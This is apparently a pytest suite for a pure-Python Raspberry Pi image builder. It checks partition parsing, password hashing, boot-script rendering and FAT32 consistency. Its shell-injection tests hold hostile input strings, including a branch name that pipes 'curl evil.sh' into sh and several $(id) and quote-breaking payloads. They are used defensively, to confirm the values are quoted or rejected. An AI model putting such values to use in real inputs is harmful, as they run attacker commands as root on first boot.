"""Tests for the pure-Python Raspberry Pi image builder.

The point of this builder is that it runs where the shell one cannot, so the
tests must not need root, bash, losetup or a 2.5 GB download either. They build
a small synthetic disk image — an MBR plus a real FAT32 partition — customise
it, and read the result back with an independent FAT parser (`fat_reader`),
which shares no code with the pyfatfs library that does the writing.

That independence is the whole point. Verifying a writer with its own reader
proves the two agree, not that the bytes are right; a Pi that will not boot
would still pass.
"""

import os
import shutil
import struct
import subprocess
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))

pytest.importorskip("pyfatfs")
pytest.importorskip("passlib")

from client.utils.pi_image_native import (  # noqa: E402
    ImageConfig,
    PiImageError,
    _install_pkg_resources_shim,
    _render,
    base_image_url,
    customize_image,
    find_fat_partition,
    hash_password_for_userconf,
)
from tests.client.fat_reader import Fat32Reader  # noqa: E402

PART_OFFSET = 1024 * 1024  # 1 MiB, as on a real Pi image
PART_SIZE = 64 * 1024 * 1024  # small enough to be quick, big enough for FAT32


def _write_mbr(path, offset, size, ptype=0x0C):
    """Write a DOS partition table with a single FAT32 LBA entry."""
    with open(path, "r+b") as fh:
        fh.seek(446)
        entry = bytearray(16)
        entry[4] = ptype
        struct.pack_into("<I", entry, 8, offset // 512)
        struct.pack_into("<I", entry, 12, size // 512)
        fh.write(bytes(entry))
        fh.seek(510)
        fh.write(b"\x55\xaa")


@pytest.fixture
def blank_image(tmp_path):
    """A synthetic disk image with an MBR and a formatted FAT32 partition."""
    _install_pkg_resources_shim()
    from pyfatfs.PyFat import PyFat
    from pyfatfs.PyFatFS import PyFatFS

    img = tmp_path / "test.img"
    with open(img, "wb") as fh:
        fh.truncate(PART_OFFSET + PART_SIZE)

    _write_mbr(str(img), PART_OFFSET, PART_SIZE)

    fat = PyFat(offset=PART_OFFSET)
    # "BOOTFS" is the label a real Raspberry Pi boot partition carries; without
    # one, fsck reports a mismatch that belongs to the fixture, not the builder.
    fat.mkfs(str(img), fat_type=PyFat.FAT_TYPE_FAT32, size=PART_SIZE,
             label="BOOTFS")
    fat.close()

    # A real base image already has these; the builder must edit, not create.
    fs = PyFatFS(filename=str(img), offset=PART_OFFSET, read_only=False)
    with fs.open("/cmdline.txt", "w") as fh:
        fh.write("console=tty1 root=PARTUUID=deadbeef-02 rootfstype=ext4 "
                 "fsck.repair=yes rootwait resize\n")
    with fs.open("/config.txt", "w") as fh:
        fh.write("arm_64bit=1\n")
    fs.close()
    return str(img)


@pytest.fixture
def config(blank_image):
    return ImageConfig(
        output_path=blank_image,
        base_image_url="unused",
        hostname="lablink-test",
        admin_user="admin",
        admin_password="Tr1cky$Pass!&|word",
        wifi_ssid="LabNet",
        wifi_password="wifi-secret",
        wifi_country="GB",
        branch="feature/some-branch",
        enable_ssh=True,
    )


class TestPartitionTable:
    """Replacing `parted`, which does not exist on Windows."""

    def test_finds_the_fat_partition(self, blank_image):
        offset, size = find_fat_partition(blank_image)
        assert offset == PART_OFFSET
        assert size == PART_SIZE

    @pytest.mark.parametrize("ptype", [0x01, 0x04, 0x06, 0x0B, 0x0C, 0x0E])
    def test_accepts_every_fat_partition_type(self, tmp_path, ptype):
        img = tmp_path / "p.img"
        with open(img, "wb") as fh:
            fh.truncate(PART_OFFSET + PART_SIZE)
        _write_mbr(str(img), PART_OFFSET, PART_SIZE, ptype=ptype)

        assert find_fat_partition(str(img))[0] == PART_OFFSET

    def test_ignores_a_linux_partition(self, tmp_path):
        """The root ext4 partition must never be chosen."""
        img = tmp_path / "p.img"
        with open(img, "wb") as fh:
            fh.truncate(PART_OFFSET + PART_SIZE)
        _write_mbr(str(img), PART_OFFSET, PART_SIZE, ptype=0x83)  # Linux

        with pytest.raises(PiImageError, match="No FAT boot partition"):
            find_fat_partition(str(img))

    def test_rejects_a_file_that_is_not_an_image(self, tmp_path):
        """A truncated or HTML-error download must not be parsed as a disk."""
        bad = tmp_path / "notanimage.img"
        bad.write_bytes(b"<html>404 Not Found</html>" + b"\0" * 600)

        with pytest.raises(PiImageError, match="MBR boot signature"):
            find_fat_partition(str(bad))


class TestPasswordHashing:
    """Replacing `openssl passwd -6`, absent on Windows and gone from 3.13."""

    def test_produces_sha512_crypt(self):
        assert hash_password_for_userconf("hunter2").startswith("$6$")

    def test_hash_verifies(self):
        from passlib.hash import sha512_crypt

        assert sha512_crypt.verify("hunter2", hash_password_for_userconf("hunter2"))

    def test_hashes_are_salted(self):
        assert hash_password_for_userconf("x") != hash_password_for_userconf("x")

    def test_handles_shell_metacharacters(self):
        """The old path interpolated this into a shell command."""
        from passlib.hash import sha512_crypt

        pw = "a'b\"c;$(id)|&`x`"
        assert sha512_crypt.verify(pw, hash_password_for_userconf(pw))

    def test_hash_contains_no_colon(self):
        """userconf.txt is colon-delimited, so a colon would corrupt it."""
        for i in range(20):
            assert ":" not in hash_password_for_userconf(f"password{i}")


class TestRender:
    def test_substitutes_placeholders(self):
        assert _render("host=__NAME__", {"NAME": "pi"}) == "host=pi"

    def test_normalises_line_endings(self):
        """A CR reaches the Pi as a bad interpreter error, not a clear one."""
        assert "\r" not in _render("#!/bin/bash\r\necho hi\r\n", {})

    def test_leaves_unknown_text_alone(self):
        assert _render("echo $HOME", {}) == "echo $HOME"


class TestBaseImageUrl:
    def test_pi_5_lite_is_arm64(self):
        url = base_image_url("5", "lite")
        assert "raspios_lite_arm64" in url and url.endswith("-arm64-lite.img.xz")

    def test_pi_3_is_armhf(self):
        assert "armhf" in base_image_url("3", "lite")

    def test_full_variant_drops_the_lite_suffix(self):
        url = base_image_url("5", "full")
        assert "raspios_arm64" in url and "lite" not in url

    def test_rejects_an_unknown_variant(self):
        with pytest.raises(PiImageError, match="Unknown OS variant"):
            base_image_url("5", "server")


class TestCustomizeImage:
    """The end-to-end check, read back by the independent parser."""

    @pytest.fixture
    def built(self, blank_image, config):
        customize_image(blank_image, config)
        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            yield fs

    def test_writes_every_expected_file(self, built):
        names = {n.lower() for n in built.list_root()}
        assert {"firstrun.sh", "lablink-first-boot.sh", "lablink-admin-password",
                "userconf.txt", "ssh", "cmdline.txt"} <= names

    def test_cmdline_invokes_the_first_run_script(self, built):
        cmdline = built.read_file("cmdline.txt").decode()
        assert "systemd.run=/boot/firmware/firstrun.sh" in cmdline
        assert "systemd.run_success_action=reboot" in cmdline
        assert "systemd.unit=kernel-command-line.target" in cmdline

    def test_cmdline_keeps_the_original_boot_arguments(self, built):
        """Dropping root= or resize leaves an unbootable image."""
        cmdline = built.read_file("cmdline.txt").decode()
        for arg in ("root=PARTUUID=deadbeef-02", "rootfstype=ext4", "rootwait",
                    "resize"):
            assert arg in cmdline

    def test_cmdline_is_a_single_line(self, built):
        """The bootloader reads one line; a second one is silently ignored."""
        assert built.read_file("cmdline.txt").decode().strip().count("\n") == 0

    def test_cmdline_is_not_appended_twice(self, blank_image, config):
        """Customising an already-customised image must not stack the hook.

        Two systemd.run= arguments is not a duplicate that cancels out; the
        kernel takes the last, and the boot arguments quietly grow each time.
        """
        customize_image(blank_image, config)
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            cmdline = fs.read_file("cmdline.txt").decode()

        assert cmdline.count("systemd.run=") == 1
        assert cmdline.count("systemd.unit=") == 1
        assert cmdline.count("root=PARTUUID=deadbeef-02") == 1

    def test_password_round_trips_exactly(self, built, config):
        """No shell quoting, so metacharacters must survive verbatim."""
        stored = built.read_file("lablink-admin-password").decode()
        assert stored == config.admin_password

    def test_userconf_names_the_admin_user_and_verifies(self, built, config):
        from passlib.hash import sha512_crypt

        user, _, hashed = built.read_file("userconf.txt").decode().strip().partition(":")
        assert user == config.admin_user
        assert sha512_crypt.verify(config.admin_password, hashed)

    def test_scripts_have_unix_line_endings(self, built):
        for name in ("firstrun.sh", "lablink-first-boot.sh"):
            assert b"\r" not in built.read_file(name), f"{name} has CRLF"

    def test_scripts_keep_their_shebang(self, built):
        for name in ("firstrun.sh", "lablink-first-boot.sh"):
            assert built.read_file(name).startswith(b"#!/bin/bash")

    def test_no_placeholders_survive(self, built):
        """An unsubstituted token becomes a literal hostname on the Pi."""
        import re

        for name in ("firstrun.sh", "lablink-first-boot.sh"):
            text = built.read_file(name).decode()
            assert not re.search(r"__[A-Z][A-Z_]*__", text), f"{name} has placeholders"

    def test_configured_values_reach_the_scripts(self, built, config):
        firstrun = built.read_file("firstrun.sh").decode()
        assert config.hostname in firstrun
        assert config.wifi_ssid in firstrun
        assert config.wifi_password in firstrun
        assert config.wifi_country in firstrun

    def test_wifi_country_is_set_and_the_radio_unblocked(self, built, config):
        """Pi OS soft-blocks the radio until a regulatory domain is set."""
        firstrun = built.read_file("firstrun.sh").decode()

        assert f"WIFI_COUNTRY='{config.wifi_country}'" in firstrun
        assert "do_wifi_country" in firstrun
        assert "rfkill unblock wifi" in firstrun

    def test_wifi_connection_filename_is_fixed(self, built):
        """An SSID may contain a slash, which is not valid in a path."""
        firstrun = built.read_file("firstrun.sh").decode()

        assert "lablink-wifi.nmconnection" in firstrun
        assert "${WIFI_SSID}.nmconnection" not in firstrun

    def test_branch_reaches_the_installer(self, built, config):
        assert config.branch in built.read_file("lablink-first-boot.sh").decode()

    def test_admin_account_is_created_before_groups_are_applied(self, built):
        """Recent Pi OS ships with no user, and userconf.txt is read a boot later.

        If firstrun.sh only adds groups it silently does nothing, and the
        account comes up without dialout - no USB serial instruments.
        """
        firstrun = built.read_file("firstrun.sh").decode()

        creates = firstrun.index("userconf-pi/userconf")
        groups = firstrun.index("usermod -aG")
        assert creates < groups, "groups are applied before the account exists"
        assert "dialout" in firstrun

    def test_ssh_flag_file_is_present(self, built):
        assert "ssh" in {n.lower() for n in built.list_root()}


class TestCustomizeImageOptions:
    def test_ssh_can_be_disabled(self, blank_image, config):
        config.enable_ssh = False
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            assert "ssh" not in {n.lower() for n in fs.list_root()}

    def test_no_password_writes_no_credentials(self, blank_image, config):
        """Leaving the password blank must not create an empty-password login."""
        config.admin_password = ""
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            names = {n.lower() for n in fs.list_root()}
        assert "userconf.txt" not in names
        assert "lablink-admin-password" not in names

    def test_no_wifi_leaves_the_wifi_block_inert(self, blank_image, config):
        """An ethernet-only Pi is configured by leaving the SSID empty.

        firstrun.sh guards the whole wifi section on a non-empty SSID, so an
        empty one must render as an empty string rather than a leftover
        placeholder, which would be a truthy SSID and write a junk connection.
        """
        config.wifi_ssid = ""
        config.wifi_password = ""
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            firstrun = fs.read_file("firstrun.sh").decode()

        assert "WIFI_SSID=''" in firstrun
        assert "WIFI_PASSWORD=''" in firstrun

    def test_rejects_an_image_that_boots_via_init(self, blank_image, config):
        """systemd.run is ignored when systemd is not PID 1 — fail loudly."""
        _install_pkg_resources_shim()
        from pyfatfs.PyFatFS import PyFatFS

        fs = PyFatFS(filename=blank_image, offset=PART_OFFSET, read_only=False)
        with fs.open("/cmdline.txt", "w") as fh:
            fh.write("rootwait init=/usr/lib/raspberrypi-sys-mods/firstboot\n")
        fs.close()

        with pytest.raises(PiImageError, match="init="):
            customize_image(blank_image, config)


class TestShellInjection:
    """firstrun.sh runs as root, and its values come from wizard text fields."""

    @pytest.mark.parametrize("hostile", [
        "it's-a-network",
        "a'; touch /tmp/pwned; echo '",
        "back\\slash",
        'double"quote',
        "$(id)",
        "`id`",
    ])
    def test_hostile_values_stay_inside_their_quotes(self, blank_image, config,
                                                     tmp_path, hostile):
        """An apostrophe in a Wi-Fi password must not end the assignment.

        Everything after it would otherwise be executed as root on first boot,
        reachable from a text field in the image-builder wizard.
        """
        config.wifi_ssid = hostile
        config.wifi_password = hostile
        config.hostname = hostile
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            firstrun = fs.read_file("firstrun.sh").decode()

        # Ask bash itself, rather than trusting our own reading of the quoting:
        # source the assignments and check the values arrive intact.
        harness = tmp_path / "check.sh"
        assignments = "\n".join(
            line for line in firstrun.splitlines()
            if line.startswith(("WIFI_SSID=", "WIFI_PASSWORD=", "NEW_HOSTNAME="))
        )
        harness.write_text(
            "canary=clean\n" + assignments + "\n"
            'printf "%s" "$WIFI_SSID" > ssid.out\n'
            'printf "%s" "$WIFI_PASSWORD" > pass.out\n'
            'printf "%s" "$canary" > canary.out\n'
        )
        result = subprocess.run(["bash", str(harness)], cwd=tmp_path,
                                capture_output=True, text=True)

        assert result.returncode == 0, f"script did not parse: {result.stderr}"
        assert (tmp_path / "ssid.out").read_text() == hostile
        assert (tmp_path / "pass.out").read_text() == hostile
        assert (tmp_path / "canary.out").read_text() == "clean"

    @pytest.mark.parametrize("field", ["wifi_ssid", "wifi_password", "hostname",
                                       "admin_user", "admin_password"])
    def test_line_breaks_are_rejected(self, blank_image, config, field):
        """A newline in an SSID would add keys to the NetworkManager file, and
        in userconf.txt would corrupt the account record."""
        setattr(config, field, "good\ninjected=value")

        with pytest.raises(PiImageError, match="line break"):
            customize_image(blank_image, config)

    def test_hostile_values_do_not_execute(self, blank_image, config, tmp_path):
        """The strongest form: the injected command must not run at all."""
        marker = tmp_path / "pwned"
        config.wifi_password = f"x'; touch {marker}; echo '"
        customize_image(blank_image, config)

        with Fat32Reader(blank_image, PART_OFFSET) as fs:
            firstrun = fs.read_file("firstrun.sh").decode()

        line = next(ln for ln in firstrun.splitlines()
                    if ln.startswith("WIFI_PASSWORD="))
        subprocess.run(["bash", "-c", line], cwd=tmp_path, capture_output=True)

        assert not marker.exists(), "injected command executed"

    @pytest.mark.parametrize("branch", [
        'main"; curl evil.sh | sh; echo "',
        "main$(id)",
        "main`id`",
        "-oProxyCommand=x",
    ])
    def test_hostile_branches_are_rejected(self, blank_image, config, branch):
        """The branch lands in a URL inside double quotes, where quoting the
        single-quote way does not help. It is restricted instead."""
        config.branch = branch

        with pytest.raises(PiImageError, match="Refusing to build with branch"):
            customize_image(blank_image, config)

    @pytest.mark.parametrize("branch", ["main", "feature/x-1", "v2.0.0", "a_b"])
    def test_ordinary_branches_are_accepted(self, blank_image, config, branch):
        config.branch = branch
        customize_image(blank_image, config)  # must not raise


class TestFilesystemConsistency:
    """The boot partition must still pass an independent filesystem check."""

    def test_fsinfo_free_count_matches_the_fat(self, blank_image, config):
        """pyfatfs allocates clusters without maintaining FSInfo.

        The count is a hint that Linux recomputes, so the Pi still boots — but
        the image fails fsck, and an image that fails a filesystem check is
        indistinguishable from a corrupt one.
        """
        customize_image(blank_image, config)

        with open(blank_image, "rb") as fh:
            fh.seek(PART_OFFSET)
            bpb = fh.read(512)
            bytes_per_sector = struct.unpack_from("<H", bpb, 11)[0]
            sectors_per_cluster = bpb[13]
            reserved = struct.unpack_from("<H", bpb, 14)[0]
            num_fats = bpb[16]
            sectors_per_fat = struct.unpack_from("<I", bpb, 36)[0]
            fsinfo_sector = struct.unpack_from("<H", bpb, 48)[0]
            total_sectors = (struct.unpack_from("<H", bpb, 19)[0]
                             or struct.unpack_from("<I", bpb, 32)[0])

            fh.seek(PART_OFFSET + fsinfo_sector * bytes_per_sector)
            reported = struct.unpack_from("<I", fh.read(512), 488)[0]

            fh.seek(PART_OFFSET + reserved * bytes_per_sector)
            fat = fh.read(sectors_per_fat * bytes_per_sector)

        # Only clusters that actually exist count; the FAT's tail is padding.
        data_sectors = total_sectors - (reserved + num_fats * sectors_per_fat)
        last_cluster = data_sectors // sectors_per_cluster + 1

        actual = sum(
            1 for c in range(2, min(last_cluster + 1, len(fat) // 4))
            if struct.unpack_from("<I", fat, c * 4)[0] & 0x0FFFFFFF == 0
        )
        assert reported == actual

    def test_fsck_reports_a_clean_filesystem(self, blank_image, config, tmp_path):
        """The closest available stand-in for the Pi's own FAT driver."""
        fsck = shutil.which("fsck.vfat") or shutil.which("dosfsck")
        if not fsck:
            pytest.skip("dosfstools is not installed")

        customize_image(blank_image, config)

        part = tmp_path / "boot.vfat"
        with open(blank_image, "rb") as src, open(part, "wb") as dst:
            src.seek(PART_OFFSET)
            dst.write(src.read(PART_SIZE))

        result = subprocess.run([fsck, "-n", str(part)],
                                capture_output=True, text=True)

        assert result.returncode == 0, (
            f"fsck reported problems:\n{result.stdout}\n{result.stderr}"
        )


class TestPkgResourcesShim:
    def test_fs_imports_after_the_shim(self):
        """setuptools >= 81 dropped pkg_resources, which `fs` still imports."""
        _install_pkg_resources_shim()
        import fs.base  # noqa: F401

    def test_shim_does_not_replace_a_real_pkg_resources(self):
        import client.utils.pi_image_native as native

        sentinel = object()
        sys.modules["pkg_resources"] = sentinel
        try:
            native._install_pkg_resources_shim()
            assert sys.modules["pkg_resources"] is sentinel
        finally:
            del sys.modules["pkg_resources"]
